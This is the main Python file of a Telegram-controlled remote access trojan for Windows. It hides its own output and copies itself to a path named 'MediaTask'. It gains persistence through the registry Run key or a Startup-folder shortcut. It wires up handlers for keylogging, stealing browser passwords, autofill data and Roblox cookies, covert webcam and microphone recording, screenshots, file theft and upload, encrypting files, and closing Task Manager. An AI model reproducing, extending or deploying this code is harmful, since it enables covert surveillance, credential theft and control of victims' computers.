##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/



from config import API_TOKEN, ALLOWED_USER_ID, MAX_ATTEMPTS, MAX_MESSAGE_LENGTH, destination_folder, directory, file_ids

import os
import logging
import sys
import asyncio
import shutil
from pathlib import Path
import subprocess
import winreg
from aiogram import types
from aiogram.filters import Command
from aiogram import F



sys.stdout = open(os.devnull, 'w')  
sys.stderr = open(os.devnull, 'w')  
logging.basicConfig(level=logging.CRITICAL + 1)
logging.getLogger('aiogram').disabled = True


logging.basicConfig(level=logging.INFO)


from config import bot, dp


def extract_file(resource_name, output_path):
    if not os.path.exists(output_path):
        current_dir = Path(__file__).resolve().parent
        resource_path = current_dir / resource_name

        if resource_path.exists():
            shutil.copy(resource_path, output_path)
        else:
            raise FileNotFoundError(f'Resource {resource_path} not found')


def copy_and_rename(destination_folder, new_name, icon_path=None):
    new_file_path = os.path.join(destination_folder, new_name)

    if os.path.exists(new_file_path):
        return "Файл уже существует. Копирование не требуется."

    current_file = sys.argv[0]

    try:
        shutil.copy(current_file, new_file_path)

        return f"Файл успешно скопирован в {new_file_path}"
    except Exception as e:
        return f"Ошибка при копировании: {e}"


def add_to_registry(script_path):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)

        winreg.SetValueEx(reg_key, "MediaTask", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)

        return True
    except Exception:
        return False


def add_to_startup_folder(script_path):
    try:
        startup_folder = os.path.expandvars(
            r"%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        )

        shortcut_name = "MediaTask.lnk"
        shortcut_path = os.path.join(startup_folder, shortcut_name)

        if os.path.exists(shortcut_path):
            return

        ps_command = (
            f"$s = (New-Object -COM WScript.Shell).CreateShortcut('{shortcut_path}'); "
            f"$s.TargetPath = '{script_path}'; "
            f"$s.WorkingDirectory = '{os.path.dirname(script_path)}'; "
            f"$s.Save()"
        )

        subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
    except Exception:
        pass


from lib.texts import user_languages

# Texts for different languages
TEXTS = {
    'ru': {
        'start': (
            " Приветствую, root. Я готов к работе.\n\n"
            " Доступные команды:\n\n"
            " Основное управление:\n"
            "/start — Запустить бота\n"
            "/pc_data — Получить информацию о ПК\n"
            "/network_diagnostics — Диагностика сети\n"
            "/shutdown_pc — Выключить ПК\n"
            "/restart_pc — Перезагрузить ПК\n"
            "/self_destruction — Удалить бота с устройства\n\n"
            " Безопасность и защита:\n"
            "/antivirus — Проверить антивирусные программы\n"
            "/cmd_boom — Вывести ошибку CMD\n"
            "/close_task_manager — Закрыть диспетчер задач\n\n"
            " Скриншоты и запись:\n"
            "/screenshot — Сделать скриншот\n"
            "/snapshot — Фото с веб-камеры\n"
            "/web_record — Видеозапись с веб-камеры\n"
            "/audio_record — Запись звука с микрофона\n"
            "/play_sound — Проиграть звук\n\n"
            " Мониторинг:\n"
            "/key_logger — Запустить кейлоггер\n"
            "/key_logs — Получить лог клавиш\n"
            "/clipboard_content — Буфер обмена\n"
            "/chrome_history — История Chrome\n"
            "/opera_history — История Opera\n"
            "/autofill — Автозаполнения браузера\n"
            "/passwords — Пароли браузера\n"
            "/robloxcookie — Получить Roblox cookie\n\n"
            "/processes — Активные процессы\n"
            "/fullprocesses — Все процессы\n"
            "/terminate_process — Завершить процесс\n\n"
            " Файлы и директории:\n"
            "/send_file — Получить файл\n"
            "/upload_file — Загрузить файл\n"
            "/delete_file — Удалить файл\n"
            "/move_file — Переместить файл\n"
            "/create_folder — Создать папку\n"
            "/delete_folder — Удалить папку\n"
            "/show_directory_content — Список файлов\n"
            "/change_directory — Сменить директорию\n\n"
            " Удалённые действия:\n"
            "/open_url — Открыть ссылку в браузере\n"
            "/alt_f4 — Закрыть активное окно\n"
            "/minimize_all_windows — Свернуть все окна\n"
            "/change_wallpaper — Сменить обои рабочего стола\n\n"
            " Управление звуком:\n"
            "/mute_sound — Выключить звук\n"
            "/unmute_sound — Включить звук\n"
            "/set_volume_100 — Установить громкость 100%\n\n"
            " Шифрование:\n"
            "/encrypt_file — Зашифровать файл\n"
            "/decipher_file — Расшифровать файл\n"
        ),
        'ready': "Готов к использованию",
        'choose_language': "Выберите язык / Choose language:",
        'language_buttons': ["Русский 🇷🇺", "English 🇬🇧"],
        'language_selected': "Язык установлен на русский 🇷🇺",
        'buttons': [
            ["Смена языка"],
            ["Антивирус", "Скриншот"],
            ["Процесы", "Фото с камеры"],
            ["Полный отчет по процесам", "Завершить процесс"],
            ["Создать папку", "Удалить папку"],
            ["Содержание директории", "Переместиться по директории"],
            ["Данные ПК", "Диагностика сети"],
            ["Запись с веб камеры", "Запись аудио"],
            ["Открыть файл", "Загрузить файл"],
            ["Скачать файл", "Удалить файл"],
            ["Зашифровать файл", "Расшифровать файл"],
            ["История хрома", "История оперы"],
            ["Автозаполнения браузера", "Пароли браузера"],
            ["Роблокс куки"],
            ["ALT + F4", "Свернуть все окна"],
            ["Посмотреть буфер обмена", "Изменить буфер обмена"],
            ["Закрыть диспетчер задач", "Открыть ссылку"],
            ["Включить звук", "Выключить звук"],
            ["Звук на 100%", "CMD бомба"],
            ["Выключить ПК", "Перезагрузить ПК"],
            ["Перемистить файл", "Поменять обои"],
            ["key logger", "key logs"],
            ["Воспроизвести звук", "Самоуничтожение"]
        ]
    },
    'en': {
        'start': (
            " Welcome, root. I'm ready to work.\n\n"
            " Available commands:\n\n"
            " Basic control:\n"
            "/start — Start the bot\n"
            "/pc_data — Get PC info\n"
            "/network_diagnostics — Network diagnostics\n"
            "/shutdown_pc — Shut down PC\n"
            "/restart_pc — Restart PC\n"
            "/self_destruction — Remove the bot from the device\n\n"
            " Security:\n"
            "/antivirus — Check antivirus\n"
            "/cmd_boom — Show CMD error\n"
            "/close_task_manager — Close Task Manager\n\n"
            " Screenshots and Recording:\n"
            "/screenshot — Take screenshot\n"
            "/snapshot — Webcam photo\n"
            "/web_record — Webcam video\n"
            "/audio_record — Microphone audio\n"
            "/play_sound — Play a sound\n\n"
            " Monitoring:\n"
            "/key_logger — Start keylogger\n"
            "/key_logs — Get key logs\n"
            "/clipboard_content — Clipboard content\n"
            "/chrome_history — Chrome history\n"
            "/opera_history — Opera history\n"
            "/autofill — Browser autofills\n"
            "/passwords — Browser passwords\n"
            "/robloxcookie — Get Roblox cookie\n\n"
            "/processes — Active processes\n"
            "/fullprocesses — All processes\n"
            "/terminate_process — Kill process\n\n"
            " Files:\n"
            "/send_file — Get file\n"
            "/upload_file — Upload file\n"
            "/delete_file — Delete file\n"
            "/move_file — Move file\n"
            "/create_folder — Create folder\n"
            "/delete_folder — Delete folder\n"
            "/show_directory_content — Directory content\n"
            "/change_directory — Change directory\n\n"
            " Remote Actions:\n"
            "/open_url — Open URL\n"
            "/alt_f4 — Close active window\n"
            "/minimize_all_windows — Minimize all windows\n"
            "/change_wallpaper — Change wallpaper\n\n"
            " Sound:\n"
            "/mute_sound — Mute\n"  
            "/unmute_sound — Unmute\n"
            "/set_volume_100 — Set volume to 100%\n\n"
            " Encryption:\n"
            "/encrypt_file — Encrypt file\n"
            "/decipher_file — Decrypt file\n"
        ),
        'ready': "Ready to use",
        'choose_language': "Choose language / Выберите язык:",
        'language_buttons': ["Русский 🇷🇺", "English 🇬🇧"],
        'language_selected': "Language set to English 🇬🇧",
        'buttons': [
            ["Change language"],
            ["Antivirus", "Screenshot"],
            ["Processes", "Webcam Photo"],
            ["Full process report", "Terminate process"],
            ["Create folder", "Delete folder"],
            ["Directory content", "Change directory"],
            ["PC Info", "Network diagnostics"],
            ["Webcam record", "Audio record"],
            ["Open file", "Upload file"],
            ["Download file", "Delete file"],
            ["Encrypt file", "Decrypt file"],
            ["Chrome history", "Opera history"],
            ["Browser autofill", "Browser passwords"],
            ["Roblox cookie"],
            ["ALT + F4", "Minimize all windows"],
            ["View clipboard", "Change clipboard"],
            ["Close task manager", "Open URL"],
            ["Unmute sound", "Mute sound"],
            ["Volume 100%", "CMD bomb"],
            ["Shutdown PC", "Reboot PC"],
            ["Move file", "Change wallpaper"],
            ["Key logger", "Key logs"],
            ["Play sound", "Self-destruction"]
        ]
    }
}

# /start command handler
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id

    # Устанавливаем язык по умолчанию, если его ещё нет
    if user_id not in user_languages:
        user_languages[user_id] = 'en'  # или 'ru' — по твоему выбору

    lang = user_languages[user_id]
    text = TEXTS[lang]['start']
    await message.answer(text)

    # Creating the keyboard using the selected language
    buttons = [[types.KeyboardButton(text=btn) for btn in row] for row in TEXTS[lang]['buttons']]
    keyboard = types.ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)
    await message.answer(TEXTS[lang]['ready'], reply_markup=keyboard)

# /language command
@dp.message(Command("language"))
async def cmd_language(message: types.Message):
    lang_buttons = [
        [types.KeyboardButton(text=TEXTS['ru']['language_buttons'][0]),
         types.KeyboardButton(text=TEXTS['ru']['language_buttons'][1])]
    ]
    keyboard = types.ReplyKeyboardMarkup(keyboard=lang_buttons, resize_keyboard=True)
    await message.answer(TEXTS['ru']['choose_language'], reply_markup=keyboard)

# Language selection handler
@dp.message(F.text.in_({"Русский 🇷🇺", "English 🇬🇧"}))
async def handle_language_choice(message: types.Message):
    user_id = message.from_user.id
    if message.text == "Русский 🇷🇺":
        user_languages[user_id] = 'ru'
        await message.answer(TEXTS['ru']['language_selected'])
    elif message.text == "English 🇬🇧":
        user_languages[user_id] = 'en'
        await message.answer(TEXTS['en']['language_selected'])

    
    await cmd_start(message)

@dp.message(F.text.in_({"Смена языка", "Change language"}))
async def handle_language_button(message: types.Message):
    await cmd_language(message)



###########################  ROBLOX COOKIE  #############################

from lib.Credintial.roblosecurity import register_roblosecurity_handler

register_roblosecurity_handler(dp)

#########################  BROWSER PASSWORDS  ###########################

from lib.Credintial.password import register_password_handler

register_password_handler(dp)

#########################  BROWSER AUTOFILL  ###########################

from lib.Credintial.autofill import register_autofill_handler

register_autofill_handler(dp)

###########################  PLAY SOUND  ###############################

from lib.Access.Audio.play_sound import register_play_sound_handlers

register_play_sound_handlers(dp)

############################# KEY LOGGER ###############################№

from lib.System.Key_logger.key_logger_handlers import key_logger_handlers

key_logger_handlers(dp)

############################ KEY LOGS ####################################

from lib.System.Key_logger.key_logs_handlers import key_logs_handlers

key_logs_handlers(dp)

########################### ANTIVIRUS ####################################

from lib.System.Antivirus.antivirus_handlers import register_antivirus_handlers

register_antivirus_handlers(dp)

##########################  SCREENSHOT  #############################

from lib.Access.Screenshot.screenshot_handlers import register_screenshot_handlers

register_screenshot_handlers(dp)

######################## Snapshot  #########################

from lib.Access.Webcam.Snapshot import register_snapshot_handlers

register_snapshot_handlers(dp)

##########################  Processes list  ############################

from lib.System.Procceses.process import register_processes_handlers

register_processes_handlers(dp)

########################  Full list of processes  ########################

from lib.System.Procceses.fullprocesses import register_full_processes_handlers

register_full_processes_handlers(dp)

##########################  Terminating process ############################

from lib.System.Procceses.terminate_process import register_terminate_process_handlers

register_terminate_process_handlers(dp)

############################  Create a folder  ################################

from lib.System.Folders.create_folder import register_create_folder

register_create_folder(dp)

############################  Delete the folder  ################################

from lib.System.Folders.delete_fodlder import register_folder_delete

register_folder_delete(dp)

###########################  Download a file  ###################################

from lib.System.File.download_file import register_download_file

register_download_file(dp)

#############################  Delete the file  #################################

from lib.System.File.delete_file import register_delete_file

register_delete_file(dp)

########################  Directory value  ############################

from lib.System.More.directory_value import register_directory_value

register_directory_value(dp)

#########################  Move to directory  #############################

from lib.System.More.move_to_directory import register_cd

register_cd(dp)

##########################  Chrome history  ################################

from lib.Credintial.Chrome_history import register_chrome_history_handlers

register_chrome_history_handlers(dp)

#####################  Webcam record  #######################

from lib.Access.Webcam.Web_record import register_webcam_record_handlers

register_webcam_record_handlers(dp)

###############################  Alt F4  ##################################

from lib.System.Folders.altf4 import register_alt_f4_handlers

register_alt_f4_handlers(dp)

##############################  Close the folder  ############################

from lib.System.Folders.closefolders import register_minimize_all_windows_handlers

register_minimize_all_windows_handlers(dp)


############################ OPEN FOLDERS #################################

from lib.System.Folders.open_folders import register_open_file_handlers
from lib.states import DirectoryStateSaveFiles

register_open_file_handlers(dp)


############################  Load a file  #############################

from lib.System.File.load_file import register_load_file

register_load_file(dp)

############################# Audio record ###############################

from  lib.Access.Audio.recordmic_handlers import register_audio_handlers

register_audio_handlers(dp)

#######################  Check copied  #########################

from lib.System.More.check_copied import register_check_copied

register_check_copied(dp)

###########################  Open url  ##############################

from lib.System.More.open_url import register_open_url

register_open_url(dp)

########################  Close dp  ##########################

from lib.System.More.close_dp import register_close_dp

register_close_dp(dp)

###########################  Opera history  ############################

from lib.Credintial.Opera_history import register_opera_history_handlers

register_opera_history_handlers(dp)

###########################  Sound off  #############################

from lib.System.Sound.Sound_off import register_mute_handlers

register_mute_handlers(dp)

###########################  Sound on  ##############################

from lib.System.Sound.Sound_on import register_sound_handlers

register_sound_handlers(dp)

########################  Volume 100%  ##########################

from lib.System.Sound.volume_100 import register_volume_100

register_volume_100(dp)

##########################  Encrypt file  #############################

from lib.System.Crypt.Encrypt import register_encrypt_handlers

register_encrypt_handlers(dp)

############################ Discrypt file  ###############################

from lib.System.Crypt.discrypt import register_discrypt

register_discrypt(dp)

###############################  CMD bomb  ###############################

from lib.System.PC.cmd_bomb import register_cmd_bomb

register_cmd_bomb(dp)

###########################  PC info  ###########################

from lib.System.PC.pc_data import register_pc_data

register_pc_data(dp)

##########################  Wifi info  ##########################

from lib.System.PC.wifi_data import register_wifi_data

register_wifi_data(dp)

###########################  PC off  #############################

from lib.System.PC.pc_off import register_shutdown_handlers

register_shutdown_handlers(dp)

###########################  PC on  ##############################

from lib.System.PC.pc_reboot import register_reboot_handlers

register_reboot_handlers(dp)

############################  Wallpaper change  ###############################

from lib.System.PC.change_wallpaper import register_wallpaper_handlers

register_wallpaper_handlers(dp)

#########################  Move file  #############################

from lib.System.Folders.move_file import register_move_file

register_move_file(dp)

#############################  Self destruction  ###########################

from lib.System.PC.self_destruction import register_self_destruction

register_self_destruction(dp)

###########################################################################


async def main():
    destination_folder = r'C:\ProgramData\MediaTask'
    new_name = 'MediaTask.exe'
    icon_path = None  

    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)

    result = copy_and_rename(destination_folder, new_name, icon_path)
  
    await dp.start_polling(bot)


if __name__ == "__main__":
    script_path = 'C:\\ProgramData\\MediaTask\\MediaTask.exe'

    if not add_to_registry(script_path):
        add_to_startup_folder(script_path)

    asyncio.run(main())